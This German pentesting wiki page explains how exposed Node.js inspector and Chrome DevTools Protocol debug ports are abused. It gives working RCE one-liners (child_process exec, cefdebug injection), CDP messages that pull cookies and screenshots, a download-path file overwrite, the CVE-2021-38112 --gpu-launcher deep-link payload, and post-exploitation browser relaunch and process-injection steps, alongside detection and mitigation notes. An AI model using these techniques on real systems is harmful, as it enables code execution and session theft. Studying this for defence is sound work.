# Missbrauch des Node-Inspectors/CEF-Debuggings

{{#include ../../banners/hacktricks-training.md}}

Historische praktische Beispiele umfassen den Multimaster-Walkthrough und den CVE-2019-1414-Visual-Studio-Code-Debugger-Angriff; verwenden Sie sie als versionsspezifischen Kontext, statt anzunehmen, dass jedes aktuelle Electron- oder Chromium-Ziel dieselben Primitives bereitstellt.<sup>[[1]](#references)[[3]](#references)</sup>

## Grundlegende Informationen

[Aus der Dokumentation](https://nodejs.org/learn/getting-started/debugging): Wenn ein Node.js-Prozess mit dem Schalter `--inspect` gestartet wird, lauscht er auf einen Debugging-Client. **Standardmäßig** lauscht er auf Host und Port **`127.0.0.1:9229`**. Jedem Prozess wird außerdem eine **eindeutige** **UUID** zugewiesen.<sup>[[4]](#references)</sup>

Inspector-Clients müssen Hostadresse, Port und UUID kennen und angeben, um eine Verbindung herzustellen. Eine vollständige URL sieht etwa so aus: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Da der **Debugger vollständigen Zugriff auf die Node.js-Ausführungsumgebung hat**, kann ein Angreifer, der eine Verbindung zu diesem Port herstellen kann, möglicherweise beliebigen Code im Namen des Node.js-Prozesses ausführen (**potenzielle Privilege Escalation**).<sup>[[4]](#references)</sup>

Es gibt mehrere Möglichkeiten, einen Inspector zu starten:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Wenn Sie einen überwachten Prozess starten, wird etwa Folgendes angezeigt:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Prozesse, die auf **CEF** (**Chromium Embedded Framework**) basieren, können einen Debugger mit `--remote-debugging-port=9222` bereitstellen. Dadurch wird der Browser über das [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) und nicht über einen Node.js-Inspector verfügbar gemacht. Daher sind auf Node.js `process` basierende Payloads standardmäßig nicht direkt anwendbar.<sup>[[2]](#references)[[5]](#references)</sup>

Wenn du einen Browser mit aktiviertem Debugging startest, wird etwa Folgendes angezeigt:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Auflisten und Steuern eines CDP-Endpunkts

Die HTTP-Erkennungsendpunkte unterscheiden den WebSocket des **Browsers** von den einzelnen WebSockets der **Targets** (Tab, Worker, Extension usw.). Frage `/json/version` für den Browser-Endpunkt und `/json/list` für Targets ab; die zurückgegebenen `webSocketDebuggerUrl`-Werte können anschließend direkt mit den JSON-RPC-ähnlichen Nachrichten von CDP gesteuert werden.<sup>[[5]](#references)</sup>
```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```
Verbinde dich beispielsweise mit `websocat "$BROWSER_WS"` und sende `{"id":1,"method":"Target.getTargets"}` oder `{"id":2,"method":"Storage.getCookies"}`. Bei einem Page target (`websocat "$PAGE_WS"`) führt `Runtime.evaluate` Code in diesem Renderer aus, und `Page.captureScreenshot` gibt einen base64-kodierten Screenshot zurück. `document.cookie` kann keine `HttpOnly`-Cookies offenlegen, während `Storage.getCookies` den Browser nach seinem Cookie-Speicher fragt.<sup>[[5]](#references)</sup>
```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```
### Browser, WebSockets und same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Websites, die in einem Webbrowser geöffnet werden, können im Rahmen des Browser-Sicherheitsmodells WebSocket- und HTTP requests senden. Eine **initiale HTTP connection** ist erforderlich, um eine **eindeutige debugger session id zu erhalten**. Die **same-origin-policy** **verhindert**, dass Websites **diese HTTP connection** herstellen können. Als zusätzliche Sicherheitsmaßnahme gegen [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** überprüft Node.js, ob die **'Host'-Header** der connection entweder eine **IP-Adresse** oder genau **`localhost`** angeben.<sup>[[4]](#references)</sup>

> [!TIP]
> Diese **Sicherheitsmaßnahme verhindert, dass der Inspector ausgenutzt wird**, um Code auszuführen, indem **einfach eine HTTP-Anfrage gesendet wird** (was durch das Ausnutzen einer SSRF-Schwachstelle möglich wäre).<sup>[[4]](#references)</sup>

### Inspector in laufenden Prozessen starten

Du kannst das **Signal SIGUSR1** an einen laufenden Node.js-Prozess senden, damit dieser den **Inspector** am Standardport **startet**. Beachte jedoch, dass du über ausreichende Berechtigungen verfügen musst. Dadurch erhältst du möglicherweise **privileged access auf Informationen innerhalb des Prozesses**, jedoch keine direkte privilege escalation.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Dies ist in Containern nützlich, da das **Herunterfahren des Prozesses und Starten eines neuen** mit `--inspect` **keine Option** ist, weil der **Container** zusammen mit dem Prozess **beendet** wird.<sup>[[6]](#references)</sup>

### Mit Inspector/Debugger verbinden

Um eine Verbindung zu einem **Chromium-basierten Browser** herzustellen, können die URLs `chrome://inspect` oder `edge://inspect` für Chrome bzw. Edge aufgerufen werden. Durch Klicken auf die Schaltfläche „Configure“ sollte sichergestellt werden, dass der **Zielhost und der Zielport** korrekt aufgelistet sind. Das Bild zeigt ein Beispiel für Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Nachdem eine URL für den Zugriff auf den Debugger angezeigt wird, z. B. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d – Mit Inspector/Debugger verbinden: Um eine Verbindung zu einem Chromium-basierten Browser herzustellen, ...](<../../images/image (674).png>)

Über die **Kommandozeile** können Sie eine Verbindung zu einem Debugger/Inspector herstellen mit:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Das Tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) ermöglicht es, **lokal laufende Inspektoren zu finden** und **Code in sie zu injizieren**.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Beachten Sie, dass **NodeJS RCE-Exploits** nicht funktionieren, wenn eine Verbindung zu einem Browser über das [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) hergestellt wurde (Sie müssen die API prüfen, um interessante Einsatzmöglichkeiten zu finden).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE im NodeJS Debugger/Inspector

> [!TIP]
> Wenn Sie hierher gekommen sind, um herauszufinden, wie Sie [**RCE über ein XSS in Electron erhalten, lesen Sie bitte diese Seite.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Einige gängige Möglichkeiten, **RCE** zu erlangen, wenn Sie eine **Verbindung** zu einem Node-**Inspector** herstellen können, bestehen in der Verwendung von etwas wie (es sieht so aus, als würde dies bei einer Verbindung zum **Chrome DevTools protocol** nicht funktionieren):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

Die API findest du hier: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
In diesem Abschnitt liste ich lediglich interessante Dinge auf, die meiner Recherche zufolge bereits zum Ausnutzen dieses Protokolls verwendet wurden.

### Chrome 136+ Einschränkung für das Standardprofil

Ab **Chrome 136** ignoriert Chrome `--remote-debugging-port` und `--remote-debugging-pipe`, wenn sie auf das **standardmäßige Chrome-Datenverzeichnis** abzielen. Der Schalter muss mit einem nicht standardmäßigen `--user-data-dir` kombiniert werden. Dessen separater Verschlüsselungsschlüssel und isolierter Browserstatus verhindern, dass die einfache flag-basierte Technik das normale authentifizierte Profil des Benutzers offenlegt. Diese Chrome-spezifische Einschränkung sollte ohne Überprüfung nicht auf ältere Chrome-Builds, Chrome for Testing, Electron/CEF-Anwendungen oder andere Chromium-Derivate übertragen werden.<sup>[[14]](#references)</sup>
```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```
Daher beweist das bloße Vorhandensein eines aktuellen Chrome-Prozesses, der nur mit `--remote-debugging-port` gestartet wurde, **nicht**, dass CDP aktiv wurde. Bestätige den Listener und `/json/version` und ermittle, welches Profil tatsächlich dahintersteht.<sup>[[14]](#references)</sup>

### Parameter Injection über Deep Links

Bei [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) entdeckte Rhino Security, dass eine auf CEF basierende Anwendung eine benutzerdefinierte UR**I** im System (**workspaces://index.html**) **registrierte**, die die vollständige URI empfing und anschließend die auf CEF basierende Anwendun**g** mit einer Konfiguration startete, die teilweise aus dieser URI erstellt wurde.<sup>[[8]](#references)</sup>

Es wurde entdeckt, dass die URI-Parameter URL decoded und zum Starten der CEF-Anwendung verwendet wurden, wodurch ein Benutzer das Flag **`--gpu-launcher`** in die **command line** **injizieren** und beliebige Befehle ausführen konnte.<sup>[[8]](#references)</sup>

Daher kann ein Payload wie dieser aussehen:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Wird eine calc.exe ausführen.<sup>[[8]](#references)</sup>

### Dateien überschreiben

Ändere den Ordner, in dem **heruntergeladene Dateien gespeichert werden**, und lade eine Datei herunter, um häufig verwendeten **Quellcode** der Anwendung mit deinem **bösartigen Code** zu **überschreiben**.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE und exfiltration

STAR Labs zeigte, dass exponierte WebDriver/CDP-Dienste beliebige Dateilesevorgänge und RCE ermöglichen können; DNS rebinding kann die Exploit-Kette in einigen Konfigurationen vervollständigen.<sup>[[9]](#references)</sup>

Weitere historische Fälle zu Browser-Automatisierung und Chromium-Sicherheit finden sich im Counter-WebDriver-Bericht sowie in den Project-Zero-Issues 773, 1742 und 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### CDP innerhalb eines laufenden Chromium-Prozesses aktivieren

Unter Windows zeigte [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler), dass die Beschränkung der Kommandozeile nicht die einzige Möglichkeit zur Aktivierung von CDP ist: Code, der bereits in der Lage ist, sich in einen bestehenden `msedge.exe`-Prozess zu injizieren, kann Chromiums nicht exportierte Funktion `content::DevToolsAgentHost::StartRemoteDebuggingServer` aufrufen und das authentifizierte Live-Profil offenlegen, ohne den Browser neu zu starten.<sup>[[15]](#references)</sup>

Die demonstrierte Kette injiziert eine DLL mit `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread`, löst interne Edge-Symbole auf (zuerst aus PDBs und anschließend mit versionsspezifischen Byte-Signaturen), ersetzt das Browserfenster durch eine Subclass und sendet eine Nachricht, sodass der abschließende Server-Startaufruf auf dem **UI-Thread** des Browsers ausgeführt wird. Der Socket wird an das Loopback-Interface gebunden. Danach können normale CDP-Primitives Cookies abrufen, Tabs erfassen, Netzwerkverkehr untersuchen oder JavaScript in authentifizierten Seiten auswerten.<sup>[[15]](#references)</sup>

> [!WARNING]
> Dies ist eine **Post-Compromise-/Process-Injection**-Technik und kein nicht authentifizierter Netzwerk-Bypass. Sie ist stark von der jeweiligen Build-Version abhängig, da die relevanten C++-Symbole nicht exportiert werden und sich Signaturen nach Browser-Updates ändern können.<sup>[[15]](#references)</sup>

Für die Erkennung sollte man sich nicht ausschließlich auf die Telemetrie der `--remote-debugging-*`-Kommandozeilenargumente verlassen: Korrelieren Sie zusätzlich ungewöhnliche Handles und Speicheroperationen gegen Browserprozesse (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, Thread-Erstellung), DLL-Injection sowie unerwartete, von Chrome/Edge besessene Loopback-Listening-Sockets.<sup>[[15]](#references)</sup>

### Post-Exploitation

In einer realen Umgebung und **nach der Kompromittierung** eines Benutzer-PCs mit einem Chromium-basierten Browser bestand eine historische Technik darin, den Browser mit aktiviertem Debugging neu zu starten und den Loopback-Port weiterzuleiten. Dadurch kann der Browsing-Zustand des Opfers auf Produkten/Builds offengelegt werden, die das ausgewählte Profil noch akzeptieren; Chrome 136+ wird dies jedoch für sein standardmäßiges Datenverzeichnis nicht berücksichtigen.<sup>[[7]](#references)[[14]](#references)</sup>

Der ursprüngliche Neustart-Befehl ist unten für ältere bzw. versionsspezifische Ziele erhalten. Der zweite Befehl ist die aktuell unterstützte Chrome-Form, erstellt jedoch ein isoliertes Profil, anstatt den normalen authentifizierten Zustand des Opfers erneut zu öffnen.<sup>[[7]](#references)[[14]](#references)</sup>
```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```
Für macOS-spezifisches Chromium relaunch-, Extension- und CDP-tradecraft siehe [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium-Debugger-Inspektions- und Exploitation-Tool](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Remote Code Execution in Visual Studio Code über den Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js-Debugging-Leitfaden - Erste Schritte](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Missbrauch des Chrome-Debugging-Features zur Remote-Beobachtung und -Steuerung von Browsing-Sitzungen](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Remote Code Execution in AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - WebDriver RCE über DNS Rebinding und CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter WebDriver - Vom Bot zu RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium-Bugtracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium-Bugtracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium-Bugtracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Änderungen an Schaltern für Remote-Debugging zur Verbesserung der Sicherheit - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [CDP in einen laufenden Edge-Browser injizieren: Eine umfassende Analyse der Laufzeit-Instrumentierung von Browsern](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
